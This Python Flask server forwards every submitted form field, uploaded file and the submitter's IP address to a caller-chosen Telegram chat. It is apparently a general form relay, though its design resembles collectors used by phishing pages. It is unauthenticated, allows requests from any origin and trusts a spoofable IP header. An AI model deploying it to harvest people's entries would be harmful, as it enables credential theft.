import os
import requests
import mimetypes
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    raise RuntimeError("❌ BOT_TOKEN is not set")

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"


# ================= RETRY FUNCTION =================
def send_with_retry(url, method="post", max_attempts=3, **kwargs):
    """
    Send request to Telegram with retry
    """
    for attempt in range(max_attempts):
        try:
            if method.lower() == "post":
                res = requests.post(url, timeout=30, **kwargs)
            else:
                res = requests.get(url, timeout=30, **kwargs)

            if res.ok:
                data = res.json()
                if data.get("ok"):
                    return True
                else:
                    print("❌ Telegram API error:", data)

        except Exception as e:
            print(f"⚠️ Attempt {attempt+1} failed:", str(e))

    return False


# ================= HOME =================
@app.route("/", methods=["GET"])
def home():
    return "✅ Server running"


# ================= MAIN ENDPOINT =================
@app.route("/send", methods=["POST"])
def send():
    try:
        chat_id = request.form.get("chat_id")

        if not chat_id:
            return jsonify({"ok": False, "error": "chat_id missing"}), 400

        # ---------- USER IP ----------
        user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

        # ---------- BUILD MESSAGE ----------
        text_lines = [
            "📱 New Submission",
            f"IP: {user_ip}",
            ""
        ]

        for key in request.form:
            if key != "chat_id":
                value = request.form.get(key)
                text_lines.append(f"{key}: {value}")

        text = "\n".join(text_lines)

        # ---------- SEND TEXT ----------
        text_sent = send_with_retry(
            f"{TG_API}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text
            }
        )

        if not text_sent:
            return jsonify({
                "ok": False,
                "error": "Failed to send message"
            }), 500

        # ---------- SEND FILES ----------
        sent_count = 0
        failed_count = 0

        for file_key in request.files:
            file = request.files[file_key]

            if not file or not file.filename:
                continue

            mime_type, _ = mimetypes.guess_type(file.filename)

            try:
                if mime_type and mime_type.startswith("image"):
                    success = send_with_retry(
                        f"{TG_API}/sendPhoto",
                        data={"chat_id": chat_id},
                        files={"photo": (file.filename, file.stream)}
                    )
                else:
                    success = send_with_retry(
                        f"{TG_API}/sendDocument",
                        data={"chat_id": chat_id},
                        files={"document": (file.filename, file.stream)}
                    )

                if success:
                    sent_count += 1
                else:
                    failed_count += 1

            except Exception as e:
                print("❌ File send error:", str(e))
                failed_count += 1

        # ---------- FINAL RESPONSE ----------
        return jsonify({
            "ok": True,
            "sent": sent_count,
            "failed": failed_count
        })

    except Exception as e:
        print("🔥 SERVER ERROR:", str(e))
        return jsonify({
            "ok": False,
            "error": "Internal server error"
        }), 500


# ================= RUN =================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)